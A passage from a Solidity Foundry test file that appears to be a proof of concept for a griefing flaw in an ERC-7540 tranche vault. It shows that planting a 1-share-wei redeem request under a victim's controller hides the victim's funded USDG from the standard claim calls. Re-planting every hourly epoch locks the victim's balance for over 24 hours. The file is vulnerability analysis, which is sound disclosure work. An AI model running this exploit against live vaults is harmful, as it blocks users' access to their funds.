            juniorVault.pendingDepositEscrowAssets() + juniorVault.withdrawalEscrowAssets(),
            "vault USDG covers both asset escrows"
        );
    }

    // ------------------------------------------------------------------ 1. benign / null cases

    /// @dev Null case: no attacker. The standard ERC-7540 claim pays the victim's funded redemption.
    function test_Benign_VictimRedeemsThroughStandardSurface() public {
        uint256 half = victimShares / 2;
        vm.prank(VICTIM);
        uint256 id = juniorVault.requestRedeem(half, VICTIM, VICTIM);
        _settleAt(id);

        assertEq(juniorVault.controllerRedeemHead(VICTIM), id, "head is the victim's own request");
        assertEq(juniorVault.maxRedeem(VICTIM), half, "standard view reports the funded shares");
        uint256 maxAssets = juniorVault.maxWithdraw(VICTIM);
        assertApproxEqAbs(maxAssets, VICTIM_DEPOSIT / 2, 1e6, "about half the deposit is claimable");

        uint256 beforeBal = settlementToken.balanceOf(VICTIM);
        vm.prank(VICTIM);
        uint256 paid = juniorVault.redeem(half, VICTIM, VICTIM);
        assertEq(paid, maxAssets, "standard redeem pays the full funded amount");
        assertEq(settlementToken.balanceOf(VICTIM) - beforeBal, paid, "USDG received");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), 0, "position closed");
        _escrowInvariant();
        console2.log("benign: USDG paid by standard redeem", paid);
    }

    /// @dev Control isolating the root cause: the same dust request, in the same quiet epoch, with the planter as its
    ///      own controller. The victim's standard surface is untouched. Only the controller argument differs.
    function test_Control_SameDustUnderPlantersOwnController_NoEffect() public {
        (uint256 plantEpoch,) = _plant(MULE);
        _warpPastCutoff(plantEpoch);
        uint256 half = victimShares / 2;
        vm.prank(VICTIM);
        uint256 id = juniorVault.requestRedeem(half, VICTIM, VICTIM);
        assertEq(id, plantEpoch + 1, "victim request lands one epoch after the dust epoch");
        _settleAt(plantEpoch);
        assertTrue(_refundEnabled(plantEpoch), "dust epoch refunded");
        _settleAt(id);

        assertEq(juniorVault.controllerRedeemHead(VICTIM), id, "victim head is its own request");
        vm.prank(VICTIM);
        uint256 paid = juniorVault.redeem(half, VICTIM, VICTIM);
        assertApproxEqAbs(paid, VICTIM_DEPOSIT / 2, 1e6, "standard redeem pays");
    }

    // ------------------------------------------------------------------ 2. reachability of the plant

    /// @dev The minimum-size waiver is what admits the dust request, and it needs an owner whose WHOLE balance is dust.
    function test_Reach_DustNeedsWholeBalanceOwner_AndNoVictimConsent() public {
        // From the attacker's main balance a 1-wei request is below the minimum and is rejected.
        vm.prank(ATTACKER);
        vm.expectRevert(TrancheVault.TrancheVault__WithdrawalTooSmall.selector);
        juniorVault.requestRedeem(1, VICTIM, ATTACKER);

        assertEq(juniorVault.controllerRedeemHead(VICTIM), 0, "victim has no redeem position");
        assertFalse(juniorVault.isOperator(VICTIM, MULE), "mule is not the victim's operator");
        assertFalse(juniorVault.isOperator(VICTIM, ATTACKER), "attacker is not the victim's operator");
        assertEq(juniorVault.allowance(VICTIM, MULE), 0, "no allowance either");

        (uint256 plantEpoch, uint256 gasUsed) = _plant(VICTIM);
        assertEq(juniorVault.controllerRedeemHead(VICTIM), plantEpoch, "third party created the victim's head");
        (uint256 positionShares,,,,,,,,) = juniorVault.redeemRequests(VICTIM, plantEpoch);
        assertEq(positionShares, 1, "1 share-wei position now belongs to the victim controller");
        assertEq(juniorVault.estimateRedeemAssets(1), 0, "the planted share-wei is worth 0 USDG atoms");
        assertEq(attackerShares - juniorVault.balanceOf(ATTACKER), 1, "attacker spent exactly 1 share-wei");
        console2.log("plant gas (transfer + requestRedeem)", gasUsed);
    }

    // ------------------------------------------------------------------ 3. the attack and every escape

    struct Pinned {
        uint256 plantEpoch;
        uint256 victimEpoch;
        uint256 half;
        uint256 funded;
    }

    function _pinVictim() internal returns (Pinned memory p) {
        (p.plantEpoch,) = _plant(VICTIM);
        _warpPastCutoff(p.plantEpoch);
        p.half = victimShares / 2;
        vm.prank(VICTIM);
        p.victimEpoch = juniorVault.requestRedeem(p.half, VICTIM, VICTIM);
        assertEq(p.victimEpoch, p.plantEpoch + 1, "victim request is in the next epoch");

        _settleAt(p.plantEpoch);
        assertTrue(_refundEnabled(p.plantEpoch), "quiet dust epoch became refund-enabled");
        _settleAt(p.victimEpoch);
        (uint256 epochShares, uint256 fundedShares,) = _epochShares(p.victimEpoch);
        assertEq(fundedShares, epochShares, "victim epoch fully funded");
        p.funded = juniorVault.claimableRedeemAssets(p.victimEpoch, VICTIM);
        assertApproxEqAbs(p.funded, VICTIM_DEPOSIT / 2, 1e6, "about 50,000 USDG sits funded in vault escrow");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), p.plantEpoch, "head is still the planted epoch");
    }

    function _assertStandardSurfaceDead(
        Pinned memory p
    ) internal {
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "maxRedeem reports 0 despite funded claim");
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "maxWithdraw reports 0 despite funded claim");
        vm.prank(VICTIM);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, VICTIM, p.half, 0));
        juniorVault.redeem(p.half, VICTIM, VICTIM);
        vm.prank(VICTIM);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, VICTIM, p.funded, 0));
        juniorVault.withdraw(p.funded, VICTIM, VICTIM);
        // No silent wrong-request consumption: a 1-share standard claim also reverts on the refundable head.
        vm.prank(VICTIM);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, VICTIM, 1, 0));
        juniorVault.redeem(1, VICTIM, VICTIM);
    }

    /// @dev Attack: the victim's funded USDG is unreachable through redeem / withdraw / maxRedeem / maxWithdraw, and
    ///      time does not thaw it (state-based, re-checked after 25 hours).
    function test_Attack_StandardClaimSurfaceDeadWhileFundedUsdgSitsInEscrow() public {
        Pinned memory p = _pinVictim();
        _assertStandardSurfaceDead(p);

        // The victim cannot cancel the planted request once matured.
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        juniorVault.cancelRedeemRequest(p.plantEpoch, VICTIM, VICTIM);

        vm.warp(vm.getBlockTimestamp() + 25 hours);
        vm.roll(block.number + 1);
        _assertStandardSurfaceDead(p);
        assertEq(juniorVault.claimableRedeemAssets(p.victimEpoch, VICTIM), p.funded, "funds still escrowed");
        _escrowInvariant();
        console2.log("attack: funded USDG behind a dead standard surface", p.funded);
    }

    /// @dev Escape A (non-standard, explicit id): pays in full at once, no cooldown, but the head stays pinned.
    function test_EscapeA_ExplicitIdClaimPaysImmediately_NoCooldown_HeadStaysPinned() public {
        Pinned memory p = _pinVictim();
        uint256 stampBefore = juniorVault.lastDepositTime(VICTIM);
        uint256 beforeBal = settlementToken.balanceOf(VICTIM);

        vm.prank(VICTIM);
        uint256 paid = juniorVault.claimRedeem(p.victimEpoch, p.half, VICTIM, VICTIM);
        assertEq(paid, p.funded, "explicit-id claim pays the full funded amount");
        assertEq(settlementToken.balanceOf(VICTIM) - beforeBal, p.funded, "USDG received");
        assertEq(juniorVault.lastDepositTime(VICTIM), stampBefore, "no cooldown stamp");

        // Remaining shares stay free: a new request and a transfer both work right away.
        uint256 rest = juniorVault.balanceOf(VICTIM);
        vm.prank(VICTIM);
        juniorVault.transfer(OPERATOR, 1e9);
        vm.prank(VICTIM);
        uint256 nextId = juniorVault.requestRedeem(rest - 1e9, VICTIM, VICTIM);

        // The planted head is still there, so the standard surface is dead for the next funded request too.
        assertEq(juniorVault.controllerRedeemHead(VICTIM), p.plantEpoch, "head still pinned");
        _settleAt(nextId);
        assertGt(juniorVault.claimableRedeemAssets(nextId, VICTIM), 0, "second request funded");
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "standard view still 0");
        _escrowInvariant();
    }

    /// @dev Escape B (documented remedy): claimRedeemRefund clears the head, but stamps the victim's cooldown, which
    ///      locks requestRedeem and transfers of the victim's whole remaining balance for exactly one hour.
    function test_EscapeB_RefundClaimClearsHead_ButStampsOneHourCooldownOnWholeBalance() public {
        Pinned memory p = _pinVictim();
        uint256 remaining = juniorVault.balanceOf(VICTIM);
        assertGt(juniorVault.maxRequestRedeem(VICTIM), 0, "before the clear the victim may request a redemption");

        // An operator cannot route the refund elsewhere to dodge the stamp.
        vm.prank(VICTIM);
        juniorVault.setOperator(OPERATOR, true);
        vm.prank(OPERATOR);
        vm.expectRevert(TrancheVault.TrancheVault__ReceiverNotController.selector);
        juniorVault.claimRedeemRefund(p.plantEpoch, OPERATOR, VICTIM);
        // The attacker cannot force the clear.
        vm.prank(ATTACKER);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        juniorVault.claimRedeemRefund(p.plantEpoch, VICTIM, VICTIM);

        uint256 t0 = vm.getBlockTimestamp();
        vm.prank(VICTIM);
        uint256 g0 = gasleft();
        uint256 refunded = juniorVault.claimRedeemRefund(p.plantEpoch, VICTIM, VICTIM);
        uint256 clearGas = g0 - gasleft();
        assertEq(refunded, 1, "the attacker's share-wei is delivered to the victim");
        assertEq(juniorVault.lastDepositTime(VICTIM), t0, "cooldown restarted on the victim");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), p.victimEpoch, "head advanced to the funded request");

        // Standard claim works again and pays in full: no USDG was lost or misrouted.
        uint256 beforeBal = settlementToken.balanceOf(VICTIM);
        vm.prank(VICTIM);
        uint256 paid = juniorVault.redeem(p.half, VICTIM, VICTIM);
        assertEq(paid, p.funded, "standard redeem pays the same amount as before the attack");
        assertEq(settlementToken.balanceOf(VICTIM) - beforeBal, p.funded, "USDG received");

        // The cost: the whole remaining balance is locked for one hour.
        assertEq(juniorVault.balanceOf(VICTIM), remaining + 1, "remaining shares plus the dust");
        assertEq(juniorVault.maxRequestRedeem(VICTIM), 0, "cannot request a redemption");
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(remaining, VICTIM, VICTIM);
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(OPERATOR, remaining);

        vm.warp(t0 + 1 hours - 1);
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(remaining, VICTIM, VICTIM);

        vm.warp(t0 + 1 hours);
        vm.prank(VICTIM);
        juniorVault.requestRedeem(remaining, VICTIM, VICTIM);
        _escrowInvariant();
        console2.log("clear gas (claimRedeemRefund)", clearGas);
        console2.log("locked share-wei for 3600s", remaining + 1);
        console2.log("locked value in USDG atoms (approx)", juniorVault.convertToAssets(remaining));
    }

    /// @dev Limit, no forced freeze: the lock in Escape B is avoidable by ordering. A victim who requests the
    ///      redemption of its remaining balance BEFORE clearing the head loses nothing to the cooldown.
    function test_Limit_RequestBeforeClearAvoidsTheLock() public {
        Pinned memory p = _pinVictim();
        uint256 remaining = juniorVault.balanceOf(VICTIM);
        vm.prank(VICTIM);
        uint256 nextId = juniorVault.requestRedeem(remaining, VICTIM, VICTIM);
        vm.prank(VICTIM);
        juniorVault.claimRedeemRefund(p.plantEpoch, VICTIM, VICTIM);
        vm.prank(VICTIM);
        assertEq(juniorVault.redeem(p.half, VICTIM, VICTIM), p.funded, "first claim paid");
        _settleAt(nextId);
        uint256 second = juniorVault.maxWithdraw(VICTIM);
        assertGt(second, 0, "second request funded and visible through the standard view");
        uint256 secondShares = juniorVault.maxRedeem(VICTIM);
        vm.prank(VICTIM);
        juniorVault.redeem(secondShares, VICTIM, VICTIM);
        assertApproxEqAbs(settlementToken.balanceOf(VICTIM), VICTIM_DEPOSIT, 2e6, "victim fully exited, on schedule");
    }

    /// @dev Pre-maturity the victim may cancel the planted request, but that path stamps the cooldown as well.
    function test_Escape_PreMaturityCancelAlsoStampsCooldown() public {
        (uint256 plantEpoch,) = _plant(VICTIM);
        uint256 t0 = vm.getBlockTimestamp();
        vm.prank(VICTIM);
        uint256 returned = juniorVault.cancelRedeemRequest(plantEpoch, VICTIM, VICTIM);
        assertEq(returned, 1, "dust returned to the victim");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), 0, "head cleared");
        assertEq(juniorVault.lastDepositTime(VICTIM), t0, "cooldown restarted");
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(victimShares, VICTIM, VICTIM);
    }

    // ------------------------------------------------------------------ 4. what defeats or changes the plant

    /// @dev Same epoch as the victim's own request: the dust merges into the victim's position. No pin, no loss.
    function test_Vary_SameEpochMerge_NoPin() public {
        uint256 half = victimShares / 2;
        vm.prank(VICTIM);
        uint256 id = juniorVault.requestRedeem(half, VICTIM, VICTIM);
        (uint256 plantEpoch,) = _plant(VICTIM);
        assertEq(plantEpoch, id, "same epoch");
        (uint256 positionShares,,,,,,,,) = juniorVault.redeemRequests(VICTIM, id);
        assertEq(positionShares, half + 1, "dust merged into the victim's own position");
        _settleAt(id);
        assertFalse(_refundEnabled(id), "epoch funded, not refunded");
        assertEq(juniorVault.maxRedeem(VICTIM), half + 1, "standard view works");
        vm.prank(VICTIM);
        uint256 paid = juniorVault.redeem(half + 1, VICTIM, VICTIM);
        assertApproxEqAbs(paid, VICTIM_DEPOSIT / 2, 1e6, "paid");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), 0, "closed");
    }

    /// @dev Busy epoch (another LP redeems in the planted epoch): the planted head is FUNDED with 1 share / 0 assets.
    ///      redeem(maxRedeem) clears it through the standard surface with no cooldown; withdraw-based claims cannot.
    function test_Vary_BusyEpoch_FundedZeroAssetHead_RedeemClearsWithdrawCannot() public {
        (uint256 plantEpoch,) = _plant(VICTIM);
        uint256 otherShares = juniorVault.balanceOf(OTHER);
        vm.prank(OTHER);
        assertEq(juniorVault.requestRedeem(otherShares / 2, OTHER, OTHER), plantEpoch, "other LP in the same epoch");
        _warpPastCutoff(plantEpoch);
        uint256 half = victimShares / 2;
        vm.prank(VICTIM);
        uint256 id = juniorVault.requestRedeem(half, VICTIM, VICTIM);
        _settleAt(plantEpoch);
        assertFalse(_refundEnabled(plantEpoch), "busy epoch is funded, not refunded");
        _settleAt(id);
        uint256 funded = juniorVault.claimableRedeemAssets(id, VICTIM);

        assertEq(juniorVault.maxRedeem(VICTIM), 1, "head reports the planted share");
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "and zero assets");
        vm.prank(VICTIM);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, VICTIM, funded, 0));
        juniorVault.withdraw(funded, VICTIM, VICTIM);

        uint256 stampBefore = juniorVault.lastDepositTime(VICTIM);
        vm.prank(VICTIM);
        assertEq(juniorVault.redeem(1, VICTIM, VICTIM), 0, "standard redeem(maxRedeem) pays 0 and closes the head");
        assertEq(juniorVault.lastDepositTime(VICTIM), stampBefore, "no cooldown");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), id, "head advanced");
        vm.prank(VICTIM);
        assertEq(juniorVault.redeem(half, VICTIM, VICTIM), funded, "victim claim paid");
    }

    // ------------------------------------------------------------------ 5. repeat every hourly epoch

    /// @dev One plant per hourly epoch. Each costs the attacker 1 share-wei plus two cheap calls and costs the victim
    ///      one claimRedeemRefund, which re-stamps the cooldown every time. A victim who clears each head as it
    ///      appears (the documented remedy) is locked at every mid-epoch check for more than 24 hours. The lock is
    ///      open only at the instant before each clear; see the limit test below for the way out.
    ///      Time is read through vm.getBlockTimestamp(): via-IR caches block.timestamp across vm.warp.
    function test_Repeat_ReplantEveryEpoch_VictimWhoClearsEachHeadStaysLocked() public {
        uint256 attackerBefore = juniorVault.balanceOf(ATTACKER);
        uint256 start = vm.getBlockTimestamp();
        uint256 plantGasTotal;
        uint256 clearGasTotal;
        uint256 rounds = 26;
        uint256 lockedChecks;

        for (uint256 i = 0; i < rounds; i++) {
            (uint256 plantEpoch, uint256 plantGas) = _plant(VICTIM);
            plantGasTotal += plantGas;
            _settleAt(plantEpoch); // permissionless; the attacker or any keeper
            assertTrue(_refundEnabled(plantEpoch), "refund-enabled head");
            assertEq(juniorVault.controllerRedeemHead(VICTIM), plantEpoch, "victim head pinned again");

            // The victim wants out of its whole balance. Just before clearing, check whether it could request.
            if (i != 0) {
                // Previous stamp was at the previous epoch start; this clear is at this epoch start = +3600s, so the
                // lock expired at this very second. Without the new clear the victim could request now.
                assertGt(juniorVault.maxRequestRedeem(VICTIM), 0, "lock from the previous clear just expired");
            }
            vm.prank(VICTIM);
            uint256 g0 = gasleft();
            juniorVault.claimRedeemRefund(plantEpoch, VICTIM, VICTIM);
            clearGasTotal += g0 - gasleft();
            assertEq(juniorVault.controllerRedeemHead(VICTIM), 0, "head cleared");

            // Locked for the whole of this epoch.
            assertEq(juniorVault.maxRequestRedeem(VICTIM), 0, "locked right after the clear");
            vm.warp(vm.getBlockTimestamp() + 30 minutes);
            vm.prank(VICTIM);
            vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
            juniorVault.requestRedeem(1e12, VICTIM, VICTIM);
            lockedChecks++;
        }

        uint256 elapsed = vm.getBlockTimestamp() - start;
        assertGt(elapsed, 24 hours, "more than 24 hours of consecutive epochs");
        assertEq(lockedChecks, rounds, "victim was locked at every mid-epoch check");
        assertEq(attackerBefore - juniorVault.balanceOf(ATTACKER), rounds, "attacker lost 1 share-wei per plant");
        assertEq(juniorVault.balanceOf(VICTIM), victimShares + rounds, "victim received the dust");
        _escrowInvariant();
        console2.log("rounds", rounds);
        console2.log("elapsed seconds", elapsed);
        console2.log("attacker gas per plant (transfer + requestRedeem)", plantGasTotal / rounds);
        console2.log("victim gas per clear (claimRedeemRefund)", clearGasTotal / rounds);
        console2.log("attacker share-wei spent", rounds);
    }

    /// @dev Limit of the repeat loop: the victim breaks it by simply not clearing. Its shares stay requestable
    ///      and its funded USDG stays claimable by explicit id, however many heads are planted.
    function test_Limit_VictimWhoIgnoresPlantsIsNeverLocked() public {
        uint256 lastPlant;
        for (uint256 i = 0; i < 3; i++) {
            (lastPlant,) = _plant(VICTIM);
            _settleAt(lastPlant);
        }
        uint256 stampBefore = juniorVault.lastDepositTime(VICTIM);
        assertGt(juniorVault.maxRequestRedeem(VICTIM), 0, "not locked");
        vm.prank(VICTIM);
        uint256 id = juniorVault.requestRedeem(victimShares, VICTIM, VICTIM);
        _settleAt(id);
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "standard surface dead behind three planted heads");
        vm.prank(VICTIM);
        uint256 paid = juniorVault.claimRedeem(id, victimShares, VICTIM, VICTIM);
        assertApproxEqAbs(paid, VICTIM_DEPOSIT, 2e6, "full exit by explicit id");
        assertEq(juniorVault.lastDepositTime(VICTIM), stampBefore, "never stamped");
    }

    // ------------------------------------------------------------------ 6. Senior instance (same code, second deploy)

    function _seniorDepositSettleClaim(
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(seniorVault), amount);
        uint256 requestId = seniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _settleAt(requestId);
        vm.prank(lp);
        shares = seniorVault.claimDeposit(requestId, amount, lp, lp);
    }

    /// @dev The Senior vault is the same contract: the same plant pins the Senior controller head.
    function test_Senior_SamePlantPinsSeniorControllerHead() public {
        uint256 vShares = _seniorDepositSettleClaim(VICTIM, 20_000e6);
        _seniorDepositSettleClaim(ATTACKER, ATTACKER_DEPOSIT);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        vm.roll(block.number + 1);

        vm.prank(ATTACKER);
        seniorVault.transfer(MULE, 1);
        vm.prank(MULE);
        uint256 plantEpoch = seniorVault.requestRedeem(1, VICTIM, MULE);
        _warpPastCutoff(plantEpoch);
        vm.prank(VICTIM);
        uint256 id = seniorVault.requestRedeem(vShares, VICTIM, VICTIM);
        assertEq(id, plantEpoch + 1, "victim request one epoch later");
        _settleAt(plantEpoch);
        (,,,,,,,,, bool refundEnabled) = seniorVault.redeemEpochs(plantEpoch);
        assertTrue(refundEnabled, "senior dust epoch refund-enabled");
        _settleAt(id);

        uint256 funded = seniorVault.claimableRedeemAssets(id, VICTIM);
        assertApproxEqAbs(funded, 20_000e6, 1e6, "about 20,000 USDG funded");
        assertEq(seniorVault.maxRedeem(VICTIM), 0, "senior standard view 0");
        vm.prank(VICTIM);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, VICTIM, vShares, 0));
        seniorVault.redeem(vShares, VICTIM, VICTIM);
        vm.prank(VICTIM);
        assertEq(seniorVault.claimRedeem(id, vShares, VICTIM, VICTIM), funded, "explicit id pays");
        console2.log("senior: funded USDG behind a dead standard surface", funded);
    }

}
```
